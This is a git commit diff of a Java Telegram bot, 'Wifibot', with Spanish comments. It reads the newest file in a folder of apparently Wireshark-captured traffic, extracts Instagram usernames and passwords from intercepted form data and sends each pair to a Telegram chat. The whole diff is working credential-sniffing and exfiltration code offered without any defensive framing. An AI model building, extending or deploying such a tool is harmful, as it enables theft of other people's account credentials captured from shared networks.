5c1cf13152a305a31e1887594ee1dee0343bd54f
Alexander <45175627+oleksandrm2dam@users.noreply.github.com>
2018-12-17 14:42:31 +0100

    aaa

--- eclipse-workspace/Telegram Bot/src/main/Wifibot.java
+++ eclipse-workspace/Telegram Bot/src/main/Wifibot.java
@@ -3,6 +3,9 @@ package main;
 import java.io.File;
 import java.io.FileInputStream;
 import java.io.IOException;
+import java.util.LinkedList;
+import java.util.regex.Matcher;
+import java.util.regex.Pattern;
 
 import org.telegram.telegrambots.bots.TelegramLongPollingBot;
 import org.telegram.telegrambots.meta.api.methods.send.SendMessage;
@@ -11,27 +14,7 @@ import org.telegram.telegrambots.meta.exceptions.TelegramApiException;
 
 public class Wifibot extends TelegramLongPollingBot {
 	
-	private static final String WIRESHARK_PATH = "files/prueba.txt";
-	
-	@Override
-	public void onUpdateReceived(Update arg0) {
-		final String messageTextReceived = arg0.getMessage().getText();
-		final long chatId = arg0.getMessage().getChatId();
-		
-		String[] data = parseFile();
-		
-		String messageTextSend = "Página web: " + data[0] + "\n";
-		messageTextSend += "Usuario: " + data[1] + "\n";
-		messageTextSend += "Contraseña: " + data[2];
-		
-		SendMessage message = new SendMessage().setChatId(chatId).setText(messageTextSend);
-		
-		try {
-			execute(message);
-		} catch (TelegramApiException e) {
-			e.printStackTrace();
-		}
-	}
+	private static final String WIRESHARK_DIR_PATH = "files";
 	
 	@Override
 	public String getBotUsername() {
@@ -40,18 +23,100 @@ public class Wifibot extends TelegramLongPollingBot {
 	
 	@Override
 	public String getBotToken() {
-		return "TOKEN AQUÍ";
+		return "";
+	}
+	
+	@Override
+	public void onUpdateReceived(Update arg0) {
+		final String messageTextReceived = arg0.getMessage().getText();
+		final long chatId = arg0.getMessage().getChatId();
+		
+		String filePath = findLatestFile();
+		LinkedList<String[]> data = parseFile(filePath);
+		int dataSize = data.size();
+		
+		if(dataSize == 0) {
+			System.out.println("No se han encontrado páginas válidas.");
+			return;
+		}
+		
+		for(int i = 0; i < dataSize; ++i) {
+			String[] temp = data.get(i);
+			String messageTextSend = "Página web: " + temp[0] + "\n";
+			messageTextSend += "Usuario: " + temp[1] + "\n";
+			messageTextSend += "Contraseña: " + temp[2];
+			SendMessage message = new SendMessage().setChatId(chatId).setText(messageTextSend);
+			
+			try {
+				execute(message);
+			} catch (TelegramApiException e) {
+				e.printStackTrace();
+			}
+		}
+	}
+	
+	private String findLatestFile() {
+		File dir = new File(WIRESHARK_DIR_PATH);
+		File[] list = dir.listFiles();
+		if(list.length > 0) {
+			File lastFileModified = list[0];
+			for(int i = 1; i < list.length; ++i) {
+				if(list[i].lastModified() > lastFileModified.lastModified()) {
+					lastFileModified = list[i];
+				}
+			}
+			try {
+				return lastFileModified.getCanonicalPath();
+			} catch (IOException e) {
+				e.printStackTrace();
+			}
+		}
+		return null;
 	}
 	
 	// Leer y parsear fichero
-	public String[] parseFile() {
-		String[] output = new String[3]; // Página web, user, password
-		String wiresharkContent = readFile(WIRESHARK_PATH);
+	public LinkedList<String[]> parseFile(String path) {
+		LinkedList<String[]> output = new LinkedList<String[]>(); // Web, user, password
+		String lines[] = readFile(path).split("\\r?\\n");
+		String customSeparator, customUsername, customPassword;
 		
-		// test
-		System.out.println(wiresharkContent);
-		output = new String[] {"Instagram", "usuario25", "password123"};
-		// test
+		for(int i = 0; i < lines.length; i += 2) {
+			int indexL = lines[i].indexOf("(");
+			int indexR = lines[i].indexOf(")");
+			
+			if(indexL == -1 || indexR == -1) {
+				continue;
+			}
+			String web = lines[i].substring(indexL + 1, indexR);
+			
+			switch(web) {
+			case "www.instagram.com":
+				customSeparator = "&";
+				customUsername = "username=";
+				customPassword = "password=";
+				break;
+			default:
+				System.out.println("Página web no válida: " + web + " (Línea " + (i + 1) + ").");
+				continue;
+			}
+			
+			String[] temp = new String[3]; // Web, user, password
+			temp[0] = web;
+			String[] args = lines[i + 1].split(customSeparator);
+			
+			for(int j = 0; j < args.length; ++j) {
+				if(args[j].startsWith(customUsername)) {
+					temp[1] = args[j].replaceFirst(customUsername, "");	
+				} else if(args[j].startsWith(customPassword)) {
+					temp[2] = args[j].replaceFirst(customPassword, "");
+				}
+			}
+			
+			if(temp[1] != null && temp[2] != null) {
+				output.add(temp);
+			}
+			
+		}
 		
 		return output;
 	}
